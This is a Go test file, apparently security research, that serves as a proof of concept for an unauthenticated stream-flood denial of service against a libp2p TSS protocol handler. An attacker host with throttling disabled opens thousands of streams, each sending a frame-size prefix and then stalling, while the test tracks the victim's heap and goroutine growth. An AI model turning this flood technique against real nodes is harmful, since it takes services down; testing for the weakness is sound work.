package libp2p

import (
	"context"
	"encoding/binary"
	"fmt"
	"runtime"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/rs/zerolog"
)

// TestPoC_UnauthenticatedStreamFlood_Escalation runs sustained, overlapping
// waves of unauthenticated stream opens against the victim's TSS protocol
// handler, WITHOUT waiting for earlier waves to drain, to determine whether
// heap/goroutine consumption grows without bound (real, unmitigated DoS) or
// plateaus (libp2p's own resource manager, or OS/kernel backlog limits,
// providing a backstop). Each stream: valid MaxFrameSize length prefix, then
// nothing — the payload never arrives, so the victim's io.ReadFull blocks
// holding its buffer for up to IOTimeout.
//
// Also captures the actual NewStream error strings so we can tell whether
// failed opens are a genuine resource-manager rejection (protective) or
// local test-harness/dial contention (not protective, just test noise).
func TestPoC_UnauthenticatedStreamFlood_Escalation(t *testing.T) {
	logger := zerolog.Nop()

	victimCfg := Config{IOTimeout: 5 * time.Second}
	victim, err := New(context.Background(), victimCfg, logger)
	if err != nil {
		t.Fatalf("failed to create victim network: %v", err)
	}
	defer victim.Close()

	if err := victim.RegisterHandler(func(peerID string, data []byte) {}); err != nil {
		t.Fatalf("failed to register handler: %v", err)
	}

	// A real attacker controls their own machine/process and has no reason to
	// keep libp2p's default self-throttling resource manager -- disable it on
	// the attacker side only. The VICTIM (created via the real `New()` above,
	// same code path as production) is completely untouched.
	attackerHost, err := libp2p.New(
		libp2p.ListenAddrStrings("/ip4/127.0.0.1/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		t.Fatalf("failed to create attacker host: %v", err)
	}
	defer attackerHost.Close()

	victimInfo := peer.AddrInfo{ID: victim.host.ID(), Addrs: victim.host.Addrs()}
	if err := attackerHost.Connect(context.Background(), victimInfo); err != nil {
		t.Fatalf("attacker failed to connect to victim: %v", err)
	}

	runtime.GC()
	var memBaseline runtime.MemStats
	runtime.ReadMemStats(&memBaseline)
	goroutinesBaseline := runtime.NumGoroutine()
	t.Logf("BASELINE: goroutines=%d heap=%d bytes", goroutinesBaseline, memBaseline.HeapAlloc)

	const waves = 6
	const streamsPerWave = 800
	var totalOpened int64
	var errCounts sync.Map // error string -> count

	openWave := func(waveNum int) {
		for i := 0; i < streamsPerWave; i++ {
			go func() {
				streamCtx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
				defer cancel()
				stream, err := attackerHost.NewStream(streamCtx, victimInfo.ID, victim.protocolID)
				if err != nil {
					key := err.Error()
					if len(key) > 80 {
						key = key[:80]
					}
					v, _ := errCounts.LoadOrStore(key, new(int64))
					atomic.AddInt64(v.(*int64), 1)
					return
				}
				atomic.AddInt64(&totalOpened, 1)

				lenBuf := make([]byte, 4)
				binary.BigEndian.PutUint32(lenBuf, uint32(MaxFrameSize))
				_, werr := stream.Write(lenBuf)
				if werr != nil {
					stream.Close()
					return
				}
				// Hold the stream open, sending nothing further, well past
				// this wave's window so waves overlap (no drain between them).
				time.Sleep(20 * time.Second)
				stream.Close()
			}()
		}
		// Intentionally not waiting here -- waves overlap.
	}

	var peakHeap uint64
	var peakGoroutines int
	stopMonitor := make(chan struct{})
	var monitorWg sync.WaitGroup
	monitorWg.Add(1)
	go func() {
		defer monitorWg.Done()
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopMonitor:
				return
			case <-ticker.C:
				var m runtime.MemStats
				runtime.ReadMemStats(&m)
				g := runtime.NumGoroutine()
				if m.HeapAlloc > peakHeap {
					peakHeap = m.HeapAlloc
				}
				if g > peakGoroutines {
					peakGoroutines = g
				}
				t.Logf("  t+%s: goroutines=%d heap=%d bytes (%.1f MiB)",
					time.Since(startTime), g, m.HeapAlloc, float64(m.HeapAlloc)/(1024*1024))
			}
		}
	}()

	startTime = time.Now()
	for w := 0; w < waves; w++ {
		t.Logf(">>> launching wave %d (%d streams, cumulative target so far: %d)", w+1, streamsPerWave, (w+1)*streamsPerWave)
		openWave(w)
		time.Sleep(3 * time.Second) // waves overlap: next wave starts before prior one's streams close
	}

	// Let the last wave run its course.
	time.Sleep(22 * time.Second)
	close(stopMonitor)
	monitorWg.Wait()

	runtime.GC()
	var memAfter runtime.MemStats
	runtime.ReadMemStats(&memAfter)
	goroutinesAfter := runtime.NumGoroutine()

	t.Logf("=== SUMMARY ===")
	t.Logf("waves=%d streamsPerWave=%d totalAttempted=%d totalOpened=%d", waves, streamsPerWave, waves*streamsPerWave, atomic.LoadInt64(&totalOpened))
	t.Logf("PEAK goroutines=%d (baseline %d, delta +%d)", peakGoroutines, goroutinesBaseline, peakGoroutines-goroutinesBaseline)
	t.Logf("PEAK heap=%d bytes (%.1f MiB) (baseline %.2f MiB, delta +%.1f MiB)",
		peakHeap, float64(peakHeap)/(1024*1024), float64(memBaseline.HeapAlloc)/(1024*1024),
		float64(peakHeap-memBaseline.HeapAlloc)/(1024*1024))
	t.Logf("AFTER drain: goroutines=%d heap=%d bytes (%.2f MiB)", goroutinesAfter, memAfter.HeapAlloc, float64(memAfter.HeapAlloc)/(1024*1024))

	t.Logf("--- NewStream failure reasons (top causes) ---")
	errCounts.Range(func(k, v any) bool {
		t.Logf("  count=%d error=%q", atomic.LoadInt64(v.(*int64)), k)
		return true
	})

	fmt.Printf("ESCALATION RESULT: attempted=%d opened=%d peakGoroutines=%d(+%d) peakHeapMiB=%.1f(+%.1f) afterGoroutines=%d afterHeapMiB=%.2f\n",
		waves*streamsPerWave, atomic.LoadInt64(&totalOpened),
		peakGoroutines, peakGoroutines-goroutinesBaseline,
		float64(peakHeap)/(1024*1024), float64(peakHeap-memBaseline.HeapAlloc)/(1024*1024),
		goroutinesAfter, float64(memAfter.HeapAlloc)/(1024*1024))
}

var startTime time.Time
